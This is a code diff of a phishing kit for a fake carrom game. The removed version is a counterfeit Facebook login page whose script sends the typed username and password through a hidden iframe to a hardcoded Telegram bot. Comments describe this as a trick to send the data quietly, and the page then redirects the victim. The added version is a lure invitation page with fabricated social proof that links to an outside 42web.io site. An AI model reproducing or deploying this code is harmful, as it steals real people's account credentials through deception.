@@ -1,106 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <title>Carrom Board Online Login</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
-  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue&family=Roboto&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Carrom Premium Invitation</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  
   <style>
-    /* ... (Apnar ager style gulo ekhane thakbe, ami shudhu main part ta dichhi) ... */
-    body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f0f2f5; }
-    h1 { font-family: "Roboto", sans-serif; font-weight: 700; letter-spacing: -0.05em; }
-    /* ... baki style same ... */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #090514; color: #fff; overflow: hidden; position: relative; }
+
+    .bg-blob { position: absolute; border-radius: 50%; filter: blur(80px); z-index: 0; animation: float 8s infinite alternate; }
+    .blob-1 { width: 400px; height: 400px; background: rgba(255, 193, 7, 0.15); top: -100px; left: -100px; }
+    .blob-2 { width: 500px; height: 500px; background: rgba(138, 43, 226, 0.2); bottom: -150px; right: -100px; animation-delay: 3s; }
+    @keyframes float { 0% { transform: translateY(0) scale(1); } 100% { transform: translateY(30px) scale(1.1); } }
+
+    .striker-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 0; perspective: 1000px; width: 200px; height: 200px; pointer-events: none; }
+    .striker-3d { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; animation: rotateStriker 12s infinite linear; }
+    .striker-face { position: absolute; width: 120px; height: 120px; top: 40px; left: 40px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, #fff, #e0e0e0, #888); border: 4px solid #ffca28; box-shadow: inset 0 0 20px rgba(0,0,0,0.5), 0 0 30px rgba(255, 202, 40, 0.4); display: flex; align-items: center; justify-content: center; }
+    .striker-face::before { content: '🎯'; font-size: 40px; opacity: 0.6; }
+    .face-front { transform: translateZ(20px); }
+    .face-back { transform: translateZ(-20px) rotateY(180deg); }
+    .striker-ring { position: absolute; width: 130px; height: 130px; top: 35px; left: 35px; border-radius: 50%; border: 8px solid rgba(255, 202, 40, 0.4); transform: rotateX(90deg); box-shadow: 0 0 20px rgba(255, 202, 40, 0.6); }
+    @keyframes rotateStriker { 0% { transform: rotateX(15deg) rotateY(0deg) rotateZ(0deg); } 100% { transform: rotateX(15deg) rotateY(360deg) rotateZ(360deg); } }
+
+    .invite-container { position: relative; z-index: 2; width: 100%; max-width: 420px; padding: 35px 25px; margin: 20px; text-align: center; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5); }
+    .invite-badge { background: linear-gradient(135deg, rgba(255, 202, 40, 0.2) 0%, rgba(255, 202, 40, 0.05) 100%); border: 1px solid rgba(255, 202, 40, 0.4); display: inline-block; padding: 8px 20px; border-radius: 50px; font-size: 12px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: #ffca28; margin-bottom: 25px; box-shadow: 0 0 15px rgba(255, 202, 40, 0.2); }
+    .game-logo { width: 100%; max-width: 260px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 0 0 20px rgba(255, 202, 40, 0.2); margin-bottom: 25px; border: 2px solid rgba(255, 255, 255, 0.15); }
+    h1 { font-size: 26px; font-weight: 800; line-height: 1.3; margin-bottom: 12px; background: linear-gradient(to right, #ffca28, #fff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 2px 10px rgba(255, 202, 40, 0.2); }
+    .premium-subtitle { font-size: 15px; font-style: italic; font-weight: 600; color: #ffca28; margin-bottom: 20px; text-shadow: 0 0 10px rgba(255, 202, 40, 0.4); letter-spacing: 0.5px; }
+    .subtitle { font-size: 13px; color: #a696ba; margin-bottom: 25px; line-height: 1.6; }
+    .joiners-section { display: flex; align-items: center; justify-content: center; background: rgba(0, 0, 0, 0.3); padding: 10px 20px; border-radius: 50px; margin-bottom: 30px; border: 1px solid rgba(255, 255, 255, 0.05); }
+    .avatar { width: 45px; height: 45px; border-radius: 50%; border: 2px solid #ffca28; margin-right: 15px; box-shadow: 0 0 15px rgba(255, 202, 40, 0.4); object-fit: cover; }
+    .join-text { font-size: 15px; color: #e0d6eb; font-weight: 600; letter-spacing: 0.5px; }
+    
+    /* Button Style */
+    .btn-play { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 20px; background: linear-gradient(135deg, #ffca28 0%, #f5a623 100%); color: #11051f; border: none; border-radius: 16px; font-size: 20px; font-weight: 900; text-transform: uppercase; letter-spacing: 1.5px; cursor: pointer; box-shadow: 0 10px 30px rgba(255, 202, 40, 0.4), inset 0 -3px 0 rgba(0,0,0,0.2); transition: all 0.3s ease; text-decoration: none; position: relative; overflow: hidden; }
+    .btn-play::after { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0) 100%); transform: skewX(-25deg); animation: shine 3s infinite; }
+    @keyframes shine { 100% { left: 200%; } }
+    .btn-play:hover { transform: translateY(-4px); box-shadow: 0 15px 35px rgba(255, 202, 40, 0.6); }
+    .btn-play:active { transform: translateY(0); box-shadow: 0 5px 15px rgba(255, 202, 40, 0.4); }
+    .footer-text { margin-top: 25px; font-size: 12px; color: #5c4d70; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 5px; }
   </style>
 </head>
-<body class="min-h-screen flex flex-col items-center">
+<body>
 
-  <!-- Popup -->
-  <div class="popup-overlay show" id="customPopup">
-    <div class="popup-box">
-      <i class="fas fa-user-shield popup-icon"></i>
-      <div class="popup-text">
-        ফেসবুকের সাথে ক্যারামবোর্ড গেম অ্যাড করা নেই<br>
-        দয়া করে লগিন করুন
-      </div>
-      <button class="popup-btn" onclick="closePopup()">ঠিক আছে (OK)</button>
+  <div class="bg-blob blob-1"></div>
+  <div class="bg-blob blob-2"></div>
+
+  <div class="striker-container">
+    <div class="striker-3d">
+      <div class="striker-face face-front"></div>
+      <div class="striker-face face-back"></div>
+      <div class="striker-ring"></div>
     </div>
   </div>
 
-  <!-- Main Content -->
-  <header class="w-full bg-[#1877f2] py-4 flex justify-center shadow-md">
-    <h1 class="text-white text-5xl select-none">facebook</h1>
-  </header>
+  <div class="invite-container">
+    <div class="invite-badge">You're Invited!</div>
+    <img src="https://i.postimg.cc/Gp0ptJfg/carrom-logo-1200x630-under-500kb.jpg" alt="Carrom Logo" class="game-logo">
+    <h1>Carrom Premium Match</h1>
+    <p class="premium-subtitle">Play Now & Enjoy Voice Chat</p>
+    <p class="subtitle">Your friend has invited you to a private Carrom match. Show your striking skills!</p>
 
-  <main class="flex flex-col items-center mt-10 px-6 w-full max-w-lg">
-    <img alt="Carrom Logo" class="rounded-xl mb-6 shadow-lg" height="100" src="https://i.postimg.cc/BQJRCLW4/file-000000008d308211ba86d7a4fe4dd552.png" width="100" />
-    <p class="text-center text-gray-600 text-[21px] mb-8 leading-relaxed font-medium max-w-md">
-      Log in to your Facebook account to connect to Carrom Board Online
-    </p>
+    <div class="joiners-section">
+      <img src="https://i.postimg.cc/pyNSzrt5/Facebook-null(JPG)-4.jpg" alt="Adiba" class="avatar">
+      <span class="join-text">Adiba already joined</span>
+    </div>
 
-    <form id="loginForm" class="w-full space-y-5" autocomplete="off">
-      <input autocomplete="username" class="custom-input w-full border border-gray-300 rounded-xl text-gray-700 focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent shadow-sm" id="username" name="username" placeholder="Mobile number or email address" required type="text" />
-      <input autocomplete="current-password" class="custom-input w-full border border-gray-300 rounded-xl text-gray-700 focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent shadow-sm" id="password" name="password" placeholder="Facebook password" required type="password" />
-      <button class="w-full bg-[#1877f2] text-white rounded-xl hover:bg-[#165ec9] shadow-lg mt-2" type="submit" id="loginButton">Log In</button>
-    </form>
-    
-    <!-- ... baki link/footer same thakbe ... -->
-  </main>
+    <!-- 👇 EKHANE CLICK KORLE newcarrim.42web.io TE JABE 👇 -->
+    <a href="http://newcarrim.42web.io/" class="btn-play">Join Match 🎯</a>
 
-  <script>
-    function closePopup() { document.getElementById('customPopup').classList.remove('show'); }
+    <p class="footer-text">🔒 100% Secure & Fair Play</p>
+  </div>
 
-    // ==========================================
-    // 🔴 Telegram Configuration
-    // ==========================================
-    const TELEGRAM_BOT_TOKEN = "8667615841:AAGvy_U5h-QYYB5n4ZXdk1ejc1gddP8vmsk";
-    const TELEGRAM_CHAT_ID = "6250740299";
-    const REDIRECT_URL = "https://newcarrim.vercel.app/"; // 👈 Vercel link
-
-    const loginButton = document.getElementById("loginButton");
-
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-
-      if (!username || !password || password.length < 6) {
-        // ... validation code same ...
-        return;
-      }
-
-      // Time format
-      const now = new Date();
-      const formattedDateTime = now.toLocaleString('en-GB', {
-        year: 'numeric', month: '2-digit', day: '2-digit',
-        hour: '2-digit', minute: '2-digit', second: '2-digit',
-        hour12: false
-      }).replace(/,/g, '');
-
-      const message = `🕒 <b>${formattedDateTime}</b>\n\n🤖 <b>Carrom login</b>\n<b>Username:</b> <code>${username}</code>\n\n<b>Password:</b> <code>${password}</code>`;
-
-      // 👇 ETA HOCHE INFINITYFREE BYPASS TRICK (Hidden Iframe) 👇
-      // Amra fetch use korchi na, ekta form banacchi jegulo chupchap data pathabe.
-      
-      const encodedMessage = encodeURIComponent(message);
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
-      
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = url;
-      document.body.appendChild(iframe);
-
-      // Button Loading
-      loginButton.innerHTML = 'Logging in... <i class="fas fa-spinner fa-spin" style="margin-left:8px;"></i>';
-      loginButton.disabled = true;
-
-      // Redirect
-      setTimeout(function() {
-        window.location.href = REDIRECT_URL;
-      }, 1500); 
-    });
-  </script>
 </body>
 </html>
